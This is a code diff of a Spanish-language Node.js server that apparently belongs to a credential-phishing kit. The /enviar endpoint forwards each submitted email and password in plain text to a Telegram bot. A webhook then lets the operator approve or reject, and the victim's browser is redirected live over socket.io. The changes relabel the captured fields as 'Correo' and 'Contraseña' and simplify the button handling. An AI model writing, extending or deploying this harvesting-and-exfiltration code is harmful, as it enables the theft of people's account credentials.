@@ -39,7 +39,7 @@ io.on('connection', (socket) => {
 app.post('/enviar', async (req, res) => {
   const { usuario, clave } = req.body;
 
-  const mensaje = `🔐 Nuevo intento de acceso:\n👤 Usuario: ${usuario}\n🔑 Clave: ${clave}`;
+  const mensaje = `🔐 Nuevo intento de acceso:\n📧 Correo: ${usuario}\n🔑 Contraseña: ${clave}`;
 
   const opciones = {
     reply_markup: {
@@ -70,41 +70,35 @@ app.post('/webhook', async (req, res) => {
   const data = callback_query.data;
   const chat_id = callback_query.from.id;
 
-  let link = '';
   let mensaje = '';
 
- // Esto depende de cómo manejás los botones, pero algo así:
-if (data === 'approve') {
-  console.log('✅ Acceso aprobado!');
-  if (currentSocket) {
-    currentSocket.emit('redirect', '/bienvenido.html'); // URL que quieras
-  }
-}
-
-if (data === 'reject') {
-  console.log('❌ Acceso rechazado!');
-  if (currentSocket) {
-    currentSocket.emit('redirect', '/denegado.html'); // Otra URL
-  }
-}
-
-  if (currentSocket) {
-    currentSocket.emit('decision', { tipo: data, url: link });
-    console.log('📡 Emitido al navegador:', data);
+  if (data === 'aceptar') {
+    console.log('✅ Acceso aprobado!');
+    mensaje = '✅ ¡Acceso aprobado!';
+    if (currentSocket) {
+      currentSocket.emit('redirect', '/bienvenido.html');
+    }
   }
 
+  if (data === 'rechazar') {
+    console.log('❌ Acceso rechazado!');
+    mensaje = '❌ Acceso rechazado.';
+    if (currentSocket) {
+      currentSocket.emit('redirect', '/denegado.html');
+    }
+  }
+
+  // Enviar mensaje de confirmación
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       chat_id,
-      text: mensaje,
-      reply_markup: {
-        inline_keyboard: [[{ text: 'Ir ahora', url: link }]]
-      }
+      text: mensaje
     })
   });
 
+  // Confirmar el botón
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
